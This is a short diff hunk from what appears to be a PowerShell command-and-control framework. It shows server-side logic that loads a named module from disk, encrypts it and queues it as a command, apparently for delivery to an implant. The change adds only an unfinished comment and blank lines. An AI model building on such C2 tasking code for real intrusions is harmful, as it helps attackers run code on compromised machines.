@@ -1544,6 +1544,9 @@ $message =[Convert]::ToBase64String($Bytes)
             {
                 $modulename = $taskid -replace 'LoadModule ', '' 
                 $module = (Get-Content -Path "C:\Temp\PowershellC2\Modules\$modulename") -join "`n"
+                # ensure the module name 
+
+
                 $module = "LoadModule"+$module
                 $fromstring = Encrypt-String $key $module
                 $commandsent = $fromstring
